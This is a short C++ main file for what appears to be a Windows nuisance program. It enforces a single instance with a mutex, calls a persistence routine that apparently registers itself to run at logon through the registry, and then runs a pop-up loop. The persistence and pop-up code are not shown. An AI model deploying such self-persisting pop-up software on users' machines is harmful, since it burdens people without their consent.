#include <iostream>
#include <windows.h>
#include "PopUp.h"
#include "Presistence.h"
#include "Mutex.h"


int main(int argc, char* argv[]) {
    Mutex mutex(NULL, MUTEX_NAME, NULL, MUTEX_ALL_ACCESS);
    
    char filePath[MAX_PATH];
    GetModuleFileNameA(NULL, filePath, MAX_PATH);
    
    std::cout << filePath << "\n";

    DWORD wait = mutex.waitForSingleObject(0);

    if (wait != 0) {
        std::cout << "Process allready running\n";
        exit(1);
    }

    LPCSTR path = argv[0];
    SIZE_T pathLength = strlen(path) + 1;

    RegistryLogon(path, pathLength);

    PopupLoop();

    return 0;
}
